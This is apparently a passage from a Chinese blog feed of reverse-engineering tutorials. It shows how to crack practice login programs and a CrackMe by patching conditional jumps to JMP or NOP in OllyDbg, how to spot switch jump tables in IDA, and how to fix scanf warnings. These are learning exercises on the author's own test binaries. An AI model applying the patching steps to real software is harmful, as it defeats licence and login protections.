punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pwd<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> inpwd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>			nflag<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>nflag <span class="token operator">></span> <span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login sucess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token keyword">else</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="mfc破解"><a class="anchor" href="#mfc破解">#</a> MFC 破解</h1>
<p>双击应用程序，弹出输入框</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160703192.png" alt="image-20220313160703192" /></p>
<p>输入任意字符进行测试，登录失败弹出 <code>login failed!</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160726232.png" alt="image-20220313160726232" /></p>
<h2 id="尝试破解"><a class="anchor" href="#尝试破解">#</a> 尝试破解</h2>
<p>使用 <code>olldbg</code>  将应用程序打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160840995.png" alt="image-20220313160840995" /></p>
<p>右键查找，选择 <code>所有可参考字符串</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160919903.png" alt="image-20220313160919903" /></p>
<p>加载完成后查找字符 <code>login</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161006569.png" alt="image-20220313161006569" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161039883.png" alt="image-20220313161039883" /></p>
<p>双击进入 <code>主函数main</code>  板块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161108356.png" alt="image-20220313161108356" /></p>
<p>通过修改 <code>je跳转</code> 的方式进行破解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161142942.png" alt="image-20220313161142942" /></p>
<p>修改为 <code>JMP SHORT 00DA11BC</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161241083.png" alt="image-20220313161241083" /></p>
<p>运行程序查看破解效果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161321199.png" alt="image-20220313161321199" /></p>
<p>此时可以看到登录成功，此外也可以参考上文通过修改登录密码的方式进行破解。</p>
<h1 id="第一个cm破解"><a class="anchor" href="#第一个cm破解">#</a> 第一个 CM 破解</h1>
<p>点击运行程序，弹出两个弹窗后运行结束</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162308541.png" alt="image-20220313162308541" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162318107.png" alt="image-20220313162318107" /></p>
<p>通过 <code>ollydbg</code>  打开应用程序，可以发现直接进入 <code>主函数main</code>  板块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162603764.png" alt="image-20220313162603764" /></p>
<p>以此判断该应用程序是使用汇编语言进行编写的，且大小非常小</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162659552.png" alt="image-20220313162659552" /></p>
<h2 id="代码分析"><a class="anchor" href="#代码分析">#</a> 代码分析</h2>
<h3 id="第一层代码分析"><a class="anchor" href="#第一层代码分析">#</a> 第一层代码分析</h3>
<ul>
<li><code>MessageBoxA</code> ：弹出效应框的 <code>api</code></li>
<li>四个参数：
<ul>
<li><code>hOwner</code> ：句柄</li>
<li><code>Text</code> ：文本信息</li>
<li><code>Title</code> ：标题</li>
<li><code>Style</code> ：控制 &quot;确定&quot;</li>
</ul>
</li>
<li><code>GetDriveTypeA</code> ：获取驱动类型</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163146986.png" alt="image-20220313163146986" /></p>
<h3 id="第二层代码分析"><a class="anchor" href="#第二层代码分析">#</a> 第二层代码分析</h3>
<ul>
<li><code>je</code> ：条件跳转，判断是否符合条件进行跳转</li>
<li>两个跳转分支：
<ul>
<li><code>Error</code></li>
<li><code>YEAH</code></li>
</ul>
</li>
<li><code>ExitProcess</code> ：结束，退出进程</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163240442.png" alt="image-20220313163240442" /></p>
<h3 id="尝试修改"><a class="anchor" href="#尝试修改">#</a> 尝试修改</h3>
<h4 id="改关键跳"><a class="anchor" href="#改关键跳">#</a> 改关键跳</h4>
<p>通过以上代码分析可以发现 <code>JE</code>  处为关键跳转</p>
<p>采用修改 <code>JE条件跳转</code> 为 <code>JMP的无条件跳转</code> 进行破解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163752895.png" alt="image-20220313163752895" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163832776.png" alt="image-20220313163832776" /></p>
<p>运行弹窗</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163952072.png" alt="image-20220313163952072" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313164003712.png" alt="image-20220313164003712" /></p>
<p>破解成功！</p>
<h4 id="强行跳转"><a class="anchor" href="#强行跳转">#</a> 强行跳转</h4>
<p>在不破坏堆栈平衡的情况下，在任意位置进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313164251105.png" alt="image-20220313164251105" /></p>
<p>修改完成后进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313164316856.png" alt="image-20220313164316856" /></p>
<p>破解成功！</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之switch分支识别</title>
    <url>/article/ca1a73d0.html</url>
    <content><![CDATA[<p>浅浅的放一张爆爆 (´▽`ʃ♡ƪ)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322202022509.png" alt="image-20220322202022509" /></p>
<h2 id="switch少分支识别"><a class="anchor" href="#switch少分支识别">#</a> switch 少分支识别</h2>
<p><code>switch/case</code>  语句与 <code>if/else</code>  语句有很多相同的地方，也有一些不同的地方，例如 <code>if/else</code>  语句在多分支的情况下会被优化成 <code>switch/case</code>  语句。所以说 <code>switch/case</code>  语句类似于语法糖的作用，给 <code>if/else</code>  语句提供了一个容错的作用。</p>
<p>以管理员身份打开 <code>ollydbg</code>  然后右键查找所有字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193002514.png" alt="image-20220322193002514" /></p>
<p>找到 <code>%d</code>  点击进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193043851.png" alt="image-20220322193043851" /></p>
<p><code>f2</code>  进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193123178.png" alt="image-20220322193123178" /></p>
<p><code>f9</code>  执行到断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322193325973.png" alt="image-20220322193325973" /></p>
<p>对 <code>主函数main</code>  分析如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322194251152.png" alt="image-20220322194251152" /></p>
<p>在 <code>C语言</code> 中的结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">switch</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        printf</pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        printf</pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        printf</pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">break</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        jmp</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 <code>if/else</code>  中的结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    printf</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    printf</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    printf</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    </pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 <code>if/else语句</code> 中只有符合条件的时候才会执行，而在 <code>switch/case结构</code> 中则会顺序往下执行。</p>
<p>在 <code>ida</code>  中打开可以看到，这个程序是 <code>Debug版本</code> 的执行程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195043108.png" alt="image-20220322195043108" /></p>
<p>双击 <code>_main_0</code>  进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195145412.png" alt="image-20220322195145412" /></p>
<p>可以更为直观的查看程序的执行结构。</p>
<p><code>f5</code>  查看代码，解析为 <code>if/else结构</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195254760.png" alt="image-20220322195254760" /></p>
<h2 id="switch多分支识别"><a class="anchor" href="#switch多分支识别">#</a> switch 多分支识别</h2>
<p>进入 <code>主函数main</code>  进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195455761.png" alt="image-20220322195455761" /></p>
<p><code>switch/case多分支结构</code> 不同于少分支结构的是：在多分支结构中会应用一个分支表</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>AA337   <span class="token operator">?</span>  <span class="token number">008</span>E A25A009D ADD BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ESI<span class="token operator">+</span><span class="token number">9</span>D005AA2<span class="token punctuation">]</span><span class="token punctuation">,</span>CL</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">005</span>AA33D   <span class="token operator">?</span>  A2 <span class="token number">5</span>A00ACA2   MOV BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>A2AC005A<span class="token punctuation">]</span><span class="token punctuation">,</span>AL</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">005</span>AA342   <span class="token operator">?</span>  <span class="token number">5</span>A            POP EDX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">005</span>AA343   <span class="token operator">?</span>  <span class="token number">00</span>BB A25A00CA ADD BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EBX<span class="token operator">+</span>CA005AA2<span class="token punctuation">]</span><span class="token punctuation">,</span>BH</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">005</span>AA349   <span class="token operator">?</span>  A2 <span class="token number">5</span>A00D9A2   MOV BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>A2D9005A<span class="token punctuation">]</span><span class="token punctuation">,</span>AL</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">005</span>AA34E   <span class="token operator">?</span>  <span class="token number">5</span>A            POP EDX</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195703814.png" alt="image-20220322195703814" /></p>
<p>主函数分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322200942366.png" alt="image-20220322200942366" /></p>
<p>可以理解为：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>判断一下是否超出跳转范围，如果超出，则直接跳出分支，提高效率</pre></td></tr><tr><td data-num="2"></td><td><pre>如果没有超出跳转范围，就计算分支表的偏移，然后读取分支表所存储的地址</pre></td></tr></table></figure><p>在 <code>ida</code>  中打开如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322201233766.png" alt="image-20220322201233766" /></p>
<p>进入主函数显示如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322201306444.png" alt="image-20220322201306444" /></p>
<p>实现以上功能取决于 <code>switch/case</code>  中的 <code>case</code>  一定是整数</p>
<p><code>f5</code>  解析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322201406590.png" alt="image-20220322201406590" /></p>
<p><strong>总结：</strong></p>
<p><code>switch/case</code>  多分支基于分支表，而分支表中储存的是地址，执行跳转的前提是 <code>case</code>  一定是<strong>整数</strong>。</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之跳转修改与滑板指令学习</title>
    <url>/article/547ee673.html</url>
    <content><![CDATA[<p>听说有人噶腰子不打麻药，awa！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304162816819.png" alt="image-20220304162816819" /></p>
<h1 id="修改跳转"><a class="anchor" href="#修改跳转">#</a> 修改跳转</h1>
<h2 id="测试程序代码"><a class="anchor" href="#测试程序代码">#</a> 测试程序代码：</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token keyword">int</span> nNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nNum<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>nNum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"True!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">else</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"False!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>通过测试程序源代码可以知道：</p>
<ul>
<li>当输入的 <code>变量nNum</code>  为 &quot; <code>0</code> &quot;时，输出结果为&quot; <code>True!</code> &quot;</li>
<li>当输入的 <code>变量nNum</code>  不为 &quot; <code>0</code> &quot;时，输出结果为&quot; <code>False!</code> &quot;</li>
</ul>
<p>代码生成属性</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304154315418.png" alt="image-20220304154315418" /></p>
<h2 id="运行测试"><a class="anchor" href="#运行测试">#</a> 运行测试：</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304151201142.png" alt="image-20220304151201142" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304151216096.png" alt="image-20220304151216096" /></p>
<h2 id="修改测试"><a class="anchor" href="#修改测试">#</a> 修改测试</h2>
<p>接下来我们通过修改跳转使该程序在无论输入什么的情况下，它的输出结果始终为 &quot; <code>True!</code> &quot;。</p>
<p>将生成好的 <code>x86Debug版</code> 的 <code>.exe</code>  文件用 <code>ollydbg</code>  打开后，找到 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124047363.png" alt="image-20220305124047363" /></p>
<h3 id="修改跳转的地址"><a class="anchor" href="#修改跳转的地址">#</a> 修改跳转的地址</h3>
<p>将 <code>JNZ SHORT 0020436F</code>  修改为 <code>jmp SHORT 00204360</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124222874.png" alt="image-20220305124222874" /></p>
<h4 id="进行测试"><a class="anchor" href="#进行测试">#</a> 进行测试</h4>
<p>此时无论输入什么，输出均为 &quot; <code>True!</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124435759.png" alt="image-20220305124435759" /></p>
<h3 id="修改对比值"><a class="anchor" href="#修改对比值">#</a> 修改对比值</h3>
<p>将 <code>CMP DWORD PTR SS:[EBP-C],0</code>  中的对比值进行修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124724098.png" alt="image-20220305124724098" /></p>
<p>修改为 <code>5</code>  后，进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305124823224.png" alt="image-20220305124823224" /></p>
<p>此时当你输入 <code>5</code>  时，输出 &quot; <code>True!</code> &quot;。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125007723.png" alt="image-20220305125007723" /></p>
<h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2>
<h3 id="报错描述"><a class="anchor" href="#报错描述">#</a> 报错描述</h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>error C4996: <span class="token string">'scanf'</span><span class="token builtin class-name">:</span> This <span class="token keyword">function</span> or variable may be unsafe. Consider using scanf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online <span class="token builtin class-name">help</span> <span class="token keyword">for</span> details.</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304142908284.png" alt="image-20220304142908284" /></p>
<p>这项报错也就是所谓的安全检查错误。</p>
<h3 id="报错原因"><a class="anchor" href="#报错原因">#</a> 报错原因</h3>
<p>在 Visual Studio 系列编译器中，认为 <code>scanf函数</code> 是不安全的，即使你引入了头文件，但是编译器还是认为它是不安全的。</p>
<h3 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h3>
<h4 id="方法一"><a class="anchor" href="#方法一">#</a> 方法一</h4>
<p>在 <code>.c</code>  或 <code>.cpp</code>  文件中的头部加入 <code>#pragma warning(disable:4996)</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304143327474.png" alt="image-20220304143327474" /></p>
<h4 id="方法二"><a class="anchor" href="#方法二">#</a> 方法二</h4>
<p>在 <code>.c</code>  或 <code>.cpp</code>  文件中的头部加入 <code>#define _CRT_SECURE_NO_WARNINGS 10</code></p>
<p><code>10</code>  可以不加也可以替换为别的整数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304143707138.png" alt="image-20220304143707138" /></p>
<h4 id="方法三"><a class="anchor" href="#方法三">#</a> 方法三</h4>
<p>按照编译器的要求使用 <code>scanf_s</code>  代替 <code>scanf</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144204845.png" alt="image-20220304144204845" /></p>
<h4 id="方法四"><a class="anchor" href="#方法四">#</a> 方法四</h4>
<p>如果不习惯用 <code>scanf_s函数</code> ，采用最多的当然是前两种方法了，但是如果在每个 <code>.c</code>  或 <code>.cpp</code>  文件里都要写上面两个方法中的其中一句时，也是一件挺麻烦的事情，所以如何把这句话在创建每一个新的 <code>.c</code>  或 <code>.cpp</code>  文件时自动写入新创建的文件当中呢？</p>
<ol>
<li>找到 Visual Stuaio 编译器的安装位置</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144717755.png" alt="image-20220304144717755" /></p>
<ol start="2">
<li>找到 VC 文件夹，点击进入</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144800899.png" alt="image-20220304144800899" /></p>
<ol start="3">
<li>找到 <code>vcprojectitems</code>  文件夹，点击进入</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144846787.png" alt="image-20220304144846787" /></p>
<ol start="4">
<li>打开 <code>newc++file.cpp</code>  文件，写入 <code>#pragma warning(disable:4996)</code>  或者 <code>#define _CRT_SECURE_NO_WARNINGS 10</code></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304144954850.png" alt="image-20220304144954850" /></p>
<p>保存提示权限不足</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304145238496.png" alt="image-20220304145238496" /></p>
<p>右键打开属性添加权限</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304145315437.png" alt="image-20220304145315437" /></p>
<p>即可成功保存</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150054148.png" alt="image-20220304150054148" /></p>
<h4 id="方法五"><a class="anchor" href="#方法五">#</a> 方法五</h4>
<p>右键项目打开属性 (Project properties)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150206651.png" alt="image-20220304150206651" /></p>
<p>在配置属性 (Configuration Properties) 中找到 C/C<ins> 预处理器 (C/C</ins>-&gt;Preprocessor)</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150229840.png" alt="image-20220304150229840" /></p>
<p>在预处理器定义 (Preprocessor Definitions) 中添加 <code>_CRT_SECURE_NO_WARNINGS</code>  即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150258216.png" alt="image-20220304150258216" /></p>
<p>好了，这样一切就大功告成了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220304150504534.png" alt="image-20220304150504534" /></p>
<h1 id="滑板指令"><a class="anchor" href="#滑板指令">#</a> 滑板指令</h1>
<p>所谓滑板指令就是直接从这个指令上过去而不产生任何作用效果</p>
<p>在 <code>x86</code>  的汇编中滑板指令为 &quot; <code>nop 90</code> &quot;</p>
<p>让 <code>主函数main</code>  中的 <code>jnz</code>  指令不执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125343989.png" alt="image-20220305125343989" /></p>
<p>将 <code>jnz</code>  指令替换成 <code>nop</code>  进行汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125416593.png" alt="image-20220305125416593" /></p>
<p>此时无论输入什么都会通过下一行的 <code>push</code>  然后通过 <code>jmp</code>  的无条件跳转到 <code>printf</code>  进行输出，而下面的 <code>push false</code>  则永远不会执行。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125521788.png" alt="image-20220305125521788" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220305125533888.png" alt="image-20220305125533888" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
</search>
